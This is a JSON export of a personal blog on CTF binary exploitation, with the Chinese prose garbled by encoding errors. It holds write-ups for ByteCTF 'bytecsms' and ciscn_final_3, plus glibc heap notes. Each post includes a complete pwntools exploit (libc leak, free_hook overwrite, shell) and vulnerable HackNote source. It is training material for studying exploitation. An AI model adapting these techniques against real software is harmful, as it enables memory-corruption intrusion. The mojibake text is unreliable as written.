{"meta":{"title":"Scardow's blog","subtitle":"","description":"","author":"Scarce Shadow","url":"https://scardow.github.io","root":"/"},"pages":[{"title":"categories","date":"2021-09-12T01:28:56.246Z","updated":"2021-09-12T01:28:56.246Z","comments":true,"path":"categories/index.html","permalink":"https://scardow.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-09-12T01:28:31.543Z","updated":"2021-09-12T01:28:31.543Z","comments":true,"path":"tags/index.html","permalink":"https://scardow.github.io/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2020-09-12T16:00:00.000Z","updated":"2021-09-22T13:04:34.859Z","comments":true,"path":"about/index.html","permalink":"https://scardow.github.io/about/index.html","excerpt":"","text":"Introdutionä¸€ä¸ªæœŸæœ›æ¯å¤©éƒ½èƒ½è¿›æ­¥çš„learning pwner ğŸ‘¶ è‡ªæˆ‘ä»‹ç»å°±å¤šæ¥ç‚¹åºŸè¯å§ Email: &#x73;&#x63;&#x61;&#114;&#x63;&#x65;&#115;&#x68;&#97;&#100;&#111;&#119;&#64;&#49;&#54;&#x33;&#x2e;&#x63;&#x6f;&#x6d; å­¦æ ¡: XDU 2020-09-13 çˆ±å¥½ï¼šä¹’ä¹“çƒï¼Œæ¯›ç¬”ï¼Œé‡‘åº¸å°è¯´ï¼Œã€Šåä¾¦æ¢æŸ¯å—ã€‹"}],"posts":[{"title":"C++PWNä¸­vectorå®¹å™¨æ•°æ®ç»“æ„çš„åˆ©ç”¨","slug":"C-pwn","date":"2021-10-31T15:26:28.000Z","updated":"2021-11-01T00:49:45.075Z","comments":true,"path":"2021/10/31/C-pwn/","link":"","permalink":"https://scardow.github.io/2021/10/31/C-pwn/","excerpt":"æˆ‘Cï¼Œå˜‰å˜‰ï¼ï¼ï¼ç„¶ç„¶å¸¦æˆ‘èµ°å§ï¼Œåˆ«è®©æˆ‘åšC++","text":"æˆ‘Cï¼Œå˜‰å˜‰ï¼ï¼ï¼ç„¶ç„¶å¸¦æˆ‘èµ°å§ï¼Œåˆ«è®©æˆ‘åšC++ C++PWNä¸­vectorçš„åˆ©ç”¨byteCTF-bytecsmsï¼Œè¿‡äº†å¥½å‡ å‘¨æ‰æƒ³èµ·æ¥å¤ç°ï¼Œæˆ‘æ˜¯æ‡’ç‹—ã€‚å‚è€ƒäº†eqqieå¸ˆå‚…çš„æ€è·¯ï¼Œå¹¶ä¸”å­¦ä¹ äº†C++çš„æŠ€å·§ æ¼æ´åœ¨äºvectorè®¡æ•°æ¼æ´ï¼Œremoveæ—¶ä¼šåˆ å»æ‰€æœ‰ç›¸åŒåå­—çš„å…ƒç´ ï¼Œè€Œbss_numä»…ä»…å‡å°‘1ï¼Œè€Œç´¢å¼•æ—¶é€šè¿‡bss_numç´¢å¼•ï¼Œè¿™å°±å¯¼è‡´äº†è¶Šç•Œè®¿é—® é€šè¿‡å¤§é‡æ·»åŠ å…ƒç´ ä½¿å¾—vectorå¤§å°è¾¾åˆ°128kï¼Œï¼ˆå®é™…è°ƒè¯•æ—¶å¤§äº128kï¼Œè¿™æ—¶é€šè¿‡editä¸€ä¸ªå¯è¯»å¯å†™çš„åœ°å€æ³„éœ²libcï¼Œè¿™é‡Œåº”è¯¥åŸæ ·å¡«å›ï¼Œå¦åˆ™ä¼šcrashã€‚åŒæ ·é“ç†ï¼Œä¿®æ”¹free_hookã€‚æˆ‘å‘ç°ä¸€ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼Œå¯ä»¥çœå»ä¸€å°æ­¥ï¼Œè™½ç„¶å¹¶æ²¡æœ‰ä»€ä¹ˆæ˜¾è‘—æ•ˆæœï¼Œå°±æ˜¯åœ¨è¾“å…¥scoreæ—¶è¾“å…¥ä¸€ä¸ªå­—æ¯å¯ä»¥ç›´æ¥è¢«å¿½ç•¥è€Œé¿å…ä¿®æ”¹é‡è¦å†…å®¹ æœ€åï¼Œuploadå‰©ä½™çš„å…ƒç´ ï¼Œä½¿å­˜æ”¾uploadçš„vectoré‡æ–°åˆ†é…ï¼Œæ­¤æ—¶ä¼šè°ƒç”¨free 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596from pwn import*context.log_level = &quot;debug&quot;p = process(&quot;./pwn&quot;)p.sendafter(b&quot;Password for admin:\\n&quot;, b&quot;\\x00&quot;)while True: if p.recv(9) == b&quot;Incorrect&quot;: p.sendafter(b&quot;Password for admin:\\n&quot;, b&quot;\\x00&quot;) else: breakdef cmd(choise: int): p.recvuntil(b&quot;&gt; &quot;) p.sendline(str(choise).encode())def add(name, scores: int): cmd(1) p.recvuntil(b&quot;name:&quot;) p.sendline(name) p.recvuntil(b&quot;scores&quot;) p.sendline(str(scores).encode()) p.recvuntil(b&quot;return&quot;) p.sendline(b&quot;4869&quot;)def remove(way: str, name_or_index): cmd(2) p.recvuntil(b&quot;index&quot;) if &quot;name&quot; == way: p.sendline(b&quot;1&quot;) p.recvuntil(&quot;deleted&quot;) p.sendline(name_or_index) elif &quot;index&quot; == way: p.sendline(b&quot;2&quot;) p.recvuntil(b&quot;Index?&quot;) p.sendline(str(name_or_index).encode())def edit(way: str, name_or_index, new_name, new_score: int): cmd(3) if &quot;name&quot; == way: p.recvuntil(b&quot;index&quot;) p.sendline(b&quot;1&quot;) p.recvuntil(b&quot;edit&quot;) p.sendline(name_or_index) elif &quot;index&quot; == way: p.recvuntil(b&quot;index&quot;) p.sendline(b&quot;2&quot;) p.recvuntil(b&quot;Index?&quot;) p.sendline(str(name_or_index).encode()) p.recvuntil(b&quot;name:&quot;) p.sendline(new_name) p.recvuntil(b&quot;score:&quot;) p.sendline(str(new_score).encode())def upload(): cmd(4)def download(): cmd(5)def exit(): cmd(6)# p *$rebase(0x207280)# leak 237568# free 238513add(b&quot;/bin/sh&quot;, 0x1)for i in range(0x2100-1): add(b&quot;/bin/sh\\x00&quot;, 0x1)upload()for i in range(100): remove(&quot;name&quot;, b&quot;/bin/sh\\x00&quot;) download()offset_mmap_libc = 0x1d7000offser_free = 0x1eeb28cmd(3)p.recvuntil(b&quot;2.Edit by index\\n&quot;)p.sendline(b&quot;2&quot;)p.recvuntil(b&quot;Index?\\n&quot;)p.sendline(b&quot;237568&quot;)p.recvuntil(b&quot;237568\\x09&quot;)libc_leak = u64(p.recv(6).ljust(8, b&quot;\\x00&quot;))p.sendline(p64(libc_leak))p.recvuntil(b&quot;score:\\n&quot;)p.sendline(&quot;a&quot;)libc = libc_leak - 4160432-151552system = libc + 0x55410success(&quot;libc_leak &quot;+hex(libc))edit(&quot;index&quot;, 238513, b&quot;a&quot;*8+p32(system&amp;0xffffffff), system&gt;&gt;32)remove(&quot;name&quot;, b&quot;/bin/sh\\x00&quot;)p.interactive() è¸©å‘è®°å½• åœ¨ioæ—¶å¡ä½ï¼Œè¿™æ˜¯åœ¨åº”è¯¥å…‹æœ ä¿®æ”¹free_hookæ—¶ï¼Œç”±äºåç§»ï¼Œåªèƒ½é€šè¿‡ä¿®æ”¹ä¸€åŠnameï¼Œä¸€åŠscoreï¼Œåœ¨è¾“å…¥scoreæ—¶ï¼Œè¯¯è¾“å…¥äº†p32ï¼Œè€Œåº”è¯¥ç›´æ¥è¾“å…¥æ•´æ•°","categories":[{"name":"writeup","slug":"writeup","permalink":"https://scardow.github.io/categories/writeup/"}],"tags":[{"name":"C++PWN","slug":"C-PWN","permalink":"https://scardow.github.io/tags/C-PWN/"},{"name":"heap","slug":"heap","permalink":"https://scardow.github.io/tags/heap/"}]},{"title":"tcache_pthread","slug":"tcache","date":"2021-10-30T05:35:21.000Z","updated":"2021-10-30T05:45:43.134Z","comments":true,"path":"2021/10/30/tcache/","link":"","permalink":"https://scardow.github.io/2021/10/30/tcache/","excerpt":"é€šè¿‡ä¸€ä¸ªå›½èµ›çš„é¢˜ç›®å­¦ä¹ tcacheåˆ©ç”¨","text":"é€šè¿‡ä¸€ä¸ªå›½èµ›çš„é¢˜ç›®å­¦ä¹ tcacheåˆ©ç”¨ Tcache_pthreadåˆ©ç”¨ciscn_final_3C++ç¨‹åºï¼Œé€»è¾‘å¾ˆç®€å•ï¼Œåªèƒ½åˆ†é…(æ¬¡æ•°ï¼š0x18)å’Œé‡Šæ”¾(UAF)ï¼Œæ²¡æœ‰ä¿®æ”¹ä¸è¾“å‡ºï¼Œåªæœ‰åˆ†é…æ—¶æä¾›å †å—åœ°å€ï¼ŒåŸé¢˜æä¾›libc-2.27ï¼Œtcacheæ— double freeæ£€æŸ¥ï¼Œé¢˜ä½¿ç”¨åŠ å…¥æ£€æŸ¥çš„2.27ç‰ˆæœ¬ å°†tcacheå¡«æ»¡ï¼ŒåŠ å…¥ä¸¤ä¸ªfastbinè¿›è¡Œdouble freeï¼Œè·å¾—0x250çš„tcachebinï¼Œå¹¶ä¿®æ”¹0x250çš„binsæ•°é‡ï¼Œä½¿ä¹‹è¿›å…¥unsorted bin ä¼ªé€ tcache nextä½¿å¾— tcacheä¸‹ä¸€æ¬¡å¯ä»¥æ‹¿åˆ°libcä¸Šçš„ä¸€ä¸ªåœ°å€ åŠ«æŒfree_hookï¼Œtcacheæ²¡æœ‰æœ‰å…³æ£€æŸ¥ï¼Œå¯ä»¥è½»æ¾æ‹¿åˆ°free_hook 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import*context.log_level = &quot;debug&quot;p = process(&quot;./ciscn_final_3_hard&quot;)def cmd(choise:int): p.recvuntil(&quot;&gt; &quot;) p.sendline(str(choise))def add(idx:int, size:int, context): cmd(1) p.recvuntil(&quot;index&quot;) p.sendline(str(idx)) p.recvuntil(&quot;size&quot;) p.sendline(str(size)) p.recvuntil(&quot;something&quot;) p.send(context) p.recvuntil(&quot;gift :&quot;) return int(p.recvline()[:-1], 16)def remove(idx:int): cmd(2) p.recvuntil(&quot;index&quot;) p.sendline(str(idx))heap = add(0, 0x70, b&quot;a&quot;*0x10) - 0x11e70# fill tcache 0x70for i in range(1, 9): add(i, 0x70, b&quot;a&quot;*0x10)for i in range(9): remove(i)# double free chunk7remove(7)# empty tcachefor i in range(9, 16): add(i, 0x70, b&quot;b&quot;*0x10)# fastbin move 2 tcache!!!fake = heap + 0x10add(16, 0x70, p64(fake))add(17, 0x70, b&quot;b&quot;*0x10)add(18, 0x70, b&quot;b&quot;*0x10)# fake tcachebin # 0x250 : 0x7 add(19, 0x70, b&quot;\\x00&quot;*(0x25-0x2)+b&quot;\\x07&quot;)# move2unsortedbinremove(19)# unsorted bin fd &lt;=&gt; fake tcache 0x20add(20, 0x50, b&quot;\\x07&quot;*0x40+p64(fake+0x60))leak = add(21, 0x50, p64(fake))libc = leak - 0x3ebca0one_gadget = libc + 0xe569fsystem = libc + 0x4f550malloc_hook = libc + 0x3ebc30free_hook = libc + 0x3ed8e8add(22, 0x10, p64(free_hook))add(23, 0x50, p64(system))gdb.attach(p)add(24, 0x10, b&quot;/bin/sh\\x00&quot;)remove(24)p.interactive() è¸©å‘è®°å½• ç”±äºtcache stash æœºåˆ¶ï¼Œfast binä¸­binsä¼šå…¨éƒ¨è¿›å…¥tcacheï¼Œè€ŒtcacheæŒ‡é’ˆæŒ‡å‘ä½ç½®æ¯”fastbin å¤šäº†0x10 tcache countä¸€å®šå¾—æ§åˆ¶å¥½ï¼Œå¦åˆ™ä¼šè«åå¥‡å¦™çš„crash","categories":[{"name":"learning","slug":"learning","permalink":"https://scardow.github.io/categories/learning/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://scardow.github.io/tags/PWN/"},{"name":"Heap exploition","slug":"Heap-exploition","permalink":"https://scardow.github.io/tags/Heap-exploition/"},{"name":"Tcache","slug":"Tcache","permalink":"https://scardow.github.io/tags/Tcache/"}]},{"title":"Heap Exploitation","slug":"Heap Exploitation","date":"2021-08-16T23:54:01.000Z","updated":"2021-10-30T05:40:59.397Z","comments":true,"path":"2021/08/17/Heap Exploitation/","link":"","permalink":"https://scardow.github.io/2021/08/17/Heap%20Exploitation/","excerpt":"æœ¬æ–‡ä¸»è¦è®°å½•å †åˆ©ç”¨æ‰‹æ³•ï¼Œå¹¶ä¼šéšå­¦ä¹ è¿‡ç¨‹ä¸æ–­è¡¥å……","text":"æœ¬æ–‡ä¸»è¦è®°å½•å †åˆ©ç”¨æ‰‹æ³•ï¼Œå¹¶ä¼šéšå­¦ä¹ è¿‡ç¨‹ä¸æ–­è¡¥å…… Heap intro briefHeap memory allocator ptmalloc2 - glibc â€¦ (å…ˆè®°å½•glibcï¼Œå¤æ‚çš„å †ç®¡ç†å™¨ä¹‹åå­¦) Mechanism of glibc mallocå †ä¸­æ•°æ®ç»“æ„ mallocåˆ†é…æœ€å°ç©ºé—´ï¼ˆSIZE_T*4ï¼‰ chunk ç»“æ„ chunkå¤´ + data Chunk åˆ†ç±»allocated chunk prev_size è‹¥è¿ç»­è®°å¿†ä½“ä¸Šä¸€å †å—ä¸ºfree chunkï¼Œprev_sizeä¸ºå‰ä¸€ä¸ªå †å—å¤§å° è‹¥è¿ç»­è®°å¿†ä½“ä¸Šä¸€å—ä¸ºallocated chunkï¼Œåˆ™ä¸ºä¸Šä¸€å—çš„data sizeç”±äºsizeå¤§å°å­˜åœ¨å¯¹é½ï¼Œæ‰€ä»¥sizeåä¸‰æ¯”ç‰¹å§‹ç»ˆä¸ºé›¶ï¼Œå› æ­¤å¯ä»¥ä¿å­˜ä¸‰ä¸ªflag PREV_INUSE (bit 0): ä¸Šä¸€å—æ˜¯å¦allocated IS_MMAPPED(bit 1): è¯¥chunkæ˜¯å¦ç”±mmapåˆ†é… NON_MAIN_ARENA(bit 2): æ˜¯å¦ä¸å±äºmain arena free chunk ( bin ) prev_size size åŒallocated chunk fdï¼šæŒ‡å‘é“¾è¡¨çš„ä¸‹ä¸€ä¸ªchunk( å«binå¤´ ) bk: æŒ‡å‘é“¾è¡¨çš„å‰ä¸€ä¸ªchunk( å«binå¤´ ) fd_nextsize: æŒ‡å‘ä¸‹ä¸€ä¸ªlarge chunk( ä¸å«binå¤´ ) bk_nextsize: æŒ‡å‘å‰ä¸€ä¸ªlarge chunk( ä¸å«binå¤´ ) top chunk ç¬¬ä¸€æ¬¡mallocåˆ†é…çš„heapä¸ºmain arenaï¼Œæœªåˆ†é…çš„å¤§å †å—ä¸ºtop chunk last remainder mallocåˆ†é…æ—¶unsorted binåˆ‡å—åå­˜å…¥ï¼Œunsorted binä»å­˜åœ¨ binchunk freeåè¿›å…¥bin fast bin å•å‘é“¾è¡¨, ç›¸åŒå¤§å°åœ¨ä¸€æ¡é“¾ä¸Š LIFO ä¸ä¼šæŠŠä¸‹ä¸€å—chunk Pè®¾ç½®æˆ0 sizeåˆ†ä¸º0x20ï¼Œ0x30ï¼Œ0x40 â€¦ 0x80 global_max_fast = 0x80 small bin åŒå‘é“¾ç¯, ç›¸åŒå¤§å°åœ¨ä¸€æ¡é“¾ä¸Š FIFO ä¼šæŠŠä¸‹ä¸€å—chunk Pè®¾ç½®æˆ0 size: 0x20, 0x30, 0x40 â€¦ 0x90 â€¦ 0x3f0 æŒ‰ç…§sizeå¤§å°åˆ†ä¸º62ä¸ªbin, åˆ†åˆ«ä¸º2~63 ä¸‹æ ‡ SIZE_SZ=8ï¼ˆ64 ä½ï¼‰ 2 0x20 3 0x30 4 0x40 5 0x50 X 0xX0 63(3F) 0x3f0 å…¶ä¸­0x20 â€¦ 0x90ä¸ºunsorted binåˆ‡å‰²ååˆ†é…çš„ large bin åŒå‘é“¾ç¯(sorted) size &gt;= 1024(0x400) ç»„ æ•°é‡ å…¬å·® 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 ä¸é™åˆ¶ unsorted bin åŒå‘é“¾ç¯ free chunkå¤§å°å¤§äº0x80, glibcå°†chunkå…ˆæ”¾å…¥unsorted bin mallocçš„æ‰§è¡Œè¿‡ç¨‹ ç¬¬ä¸€æ¬¡mallocï¼šå½“ç”³è¯·å†…å­˜ç©ºé—´ &lt;128 KB æ—¶ï¼Œ kernelåˆ†é…132KB çš„top chunkï¼›&gt;128KB æ—¶ï¼Œä½¿ç”¨mmapåˆ†é…å†…å­˜ ç¬¬äºŒæ¬¡åŠä¹‹åï¼š fastbin(LIFO) bins æŒ‰ç…§ç´¢å¼•ä»å°åˆ°å¤§æŸ¥æ‰¾ top chunk å‘kernelç´¢è¦ç©ºé—´ free çš„æ‰§è¡Œè¿‡ç¨‹ä¸chunkçš„åˆå¹¶ free chunkå…ˆçœ‹ä¸Šä¸€å—æ˜¯å¦ä¸ºfree chunk(Pä½æ˜¯å¦ä¸º0)ï¼Œè‹¥æ˜¯ï¼Œåˆ™äºå‰ä¸€å †å—åˆå¹¶ï¼Œåœ¨å¯¹å‰ä¸€ä¸ªå †å—unlink å†çœ‹ä¸‹ä¸€å †å—ï¼š top chunk: ä¸ä¹‹åˆå¹¶ï¼ˆç¬¬äºŒæ­¥ä½¿ç”¨çš„æ˜¯åˆå¹¶ä¹‹åçš„å †å—ï¼‰ freeï¼šåˆå¹¶åä¸€åŒåŠ å…¥unsorted bin inuseï¼šåŠ å…¥unsorted bin å †åˆ©ç”¨æ‰‹æ³• UAFfree(pointer) åæœªå°†æŒ‡é’ˆptræ¸…ç©º, è¯¥ptrç§°ä½œdangling pointerï¼Œå³ä¸ºä¸€ä¸ªpointeræŒ‡å‘ä¸€å—é‡Šæ”¾çš„è®°å¿†ä½“. åˆ©ç”¨ infomation leak free ä¸¤ä¸ªfastbin sizeçš„chunkï¼Œç¬¬äºŒä¸ªchunk fdæŒ‡å‘ç¬¬ä¸€ä¸ªchunkï¼Œè‹¥å­˜åœ¨UAFï¼Œå¯å°†chunk user dateè¾“å‡ºleak addr mallocä¸€å—éfastbinï¼Œfreeæ˜¯è¿›å…¥unsorted binï¼Œfd æŒ‡å‘libcï¼Œkeè¾“å‡ºæˆ–mallocå›è¯¥å †å— struct type confusion double free æ¡ˆä¾‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;struct note &#123; void (*printnote)(); char *content ;&#125;;struct note *notelist[5];int count = 0; void print_note_content(struct note *this)&#123; puts(this-&gt;content);&#125;void add_note()&#123; int i ; char buf[8]; int size ; if(count &gt; 5)&#123; puts(&quot;Full&quot;); return ; &#125; for(i = 0 ; i &lt; 5 ; i ++)&#123; if(!notelist[i])&#123; notelist[i] = (struct note*)malloc(sizeof(struct note)); if(!notelist[i])&#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; notelist[i]-&gt;printnote = print_note_content; printf(&quot;Note size :&quot;); read(0,buf,8); size = atoi(buf); notelist[i]-&gt;content = (char *)malloc(size); if(!notelist[i]-&gt;content)&#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; printf(&quot;Content :&quot;); read(0,notelist[i]-&gt;content,size); puts(&quot;Success !&quot;); count++; break; &#125; &#125;&#125;void del_note()&#123; char buf[4]; int idx ; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= count)&#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if(notelist[idx])&#123; free(notelist[idx]-&gt;content); free(notelist[idx]); puts(&quot;Success&quot;); &#125;&#125;void print_note()&#123; char buf[4]; int idx ; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= count)&#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if(notelist[idx])&#123; notelist[idx]-&gt;printnote(notelist[idx]); &#125;&#125;void magic()&#123; system(&quot;id&quot;);&#125;void menu()&#123; puts(&quot;----------------------&quot;); puts(&quot; HackNote &quot;); puts(&quot;----------------------&quot;); puts(&quot; 1. Add note &quot;); puts(&quot; 2. Delete note &quot;); puts(&quot; 3. Print note &quot;); puts(&quot; 4. Exit &quot;); puts(&quot;----------------------&quot;); printf(&quot;Your choice :&quot;);&#125;;int main()&#123; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); char buf[4]; while(1)&#123; menu(); read(0,buf,4); switch(atoi(buf))&#123; case 1 : add_note(); break ; case 2 : del_note(); break ; case 3 : print_note(); break ; case 4 : exit(0); break ; default : puts(&quot;Invalid choice&quot;); break ; &#125; &#125; return 0;&#125; æ¼æ´ç‚¹ freeåæœªå°†æŒ‡é’ˆæ¸…ç©ºé€ æˆUAF åˆ©ç”¨ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *host = &quot;training.pwnable.tw&quot;port = 11010# r = remote(host,port)r = process(&quot;./hacknote&quot;)gdb.attach(r)def addnote(size,content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content)def delnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def printnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))magic = 0x08048986# system@plt + 6system = 0x8048506addnote(32,&quot;ddaa&quot;)addnote(32,&quot;ddaa&quot;)addnote(32,&quot;ddaa&quot;)delnote(0)delnote(1)# note = system# context = &quot;;sh;&quot;addnote(8,p32(system) + b&quot;;sh;&quot;)printnote(0)r.interactive() Heap overflowåˆ©ç”¨using unlinké€è¿‡overflowè¦†ç›–free chunkçš„fdã€bkï¼Œå†åˆ©ç”¨unlink unlinkåŸç† æ ¹æ®ä¸Šå›¾ï¼ŒçŸ¥shellcodeè¢«æˆªæ–­ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨jmpæŒ‡ä»¤è·³è¿‡ å¸¦æœ‰ä¿æŠ¤æœºåˆ¶çš„unlinkFastbin attackåˆ©ç”¨Double free åªä¼šæ£€æŸ¥fastbin link listæ˜¯å¦ç­‰äºå°†è¦freeçš„chunk free(a); free(b); free(a) æ­¤æ—¶ï¼Œåœ¨mallocä¸€ä¸ªä¸ a ç›¸åŒå¤§å°çš„chunkï¼Œåˆ™ä¼šå–å‡º aï¼Œè¿™æ—¶a æ—¢ä¸ºfreeï¼Œåˆä¸ºallocatedï¼Œè‹¥åœ¨aä¸­è¾“å…¥æ•°æ®ï¼Œå°±ä¼šæ›´æ”¹açš„fdæŒ‡é’ˆï¼Œä»è€Œæ„é€ fake chunkï¼Œmallocå‡ºfakeä¹‹åï¼Œé€ æˆä»»æ„åœ°å€ä»»æ„å†™ï¼Œæˆ–å†™å…¥æ ˆä¸­æ§åˆ¶ç¨‹åºæµ mallocæ—¶ä¼šæ£€æµ‹chunk size åœ¨fake chunkåœ°å€ + 0x8 ä¼ªé€ size åœ¨é™„è¿‘å¯»æ‰¾ç›®æ ‡size åˆ©ç”¨æŠ€å·§ å‚è€ƒèµ„æ–™ï¼š CTFwiki Angleboyçš„PPT","categories":[{"name":"note","slug":"note","permalink":"https://scardow.github.io/categories/note/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://scardow.github.io/tags/PWN/"},{"name":"Heap exploition","slug":"Heap-exploition","permalink":"https://scardow.github.io/tags/Heap-exploition/"},{"name":"glibc","slug":"glibc","permalink":"https://scardow.github.io/tags/glibc/"}]}],"categories":[{"name":"writeup","slug":"writeup","permalink":"https://scardow.github.io/categories/writeup/"},{"name":"learning","slug":"learning","permalink":"https://scardow.github.io/categories/learning/"},{"name":"note","slug":"note","permalink":"https://scardow.github.io/categories/note/"}],"tags":[{"name":"C++PWN","slug":"C-PWN","permalink":"https://scardow.github.io/tags/C-PWN/"},{"name":"heap","slug":"heap","permalink":"https://scardow.github.io/tags/heap/"},{"name":"PWN","slug":"PWN","permalink":"https://scardow.github.io/tags/PWN/"},{"name":"Heap exploition","slug":"Heap-exploition","permalink":"https://scardow.github.io/tags/Heap-exploition/"},{"name":"Tcache","slug":"Tcache","permalink":"https://scardow.github.io/tags/Tcache/"},{"name":"glibc","slug":"glibc","permalink":"https://scardow.github.io/tags/glibc/"}]}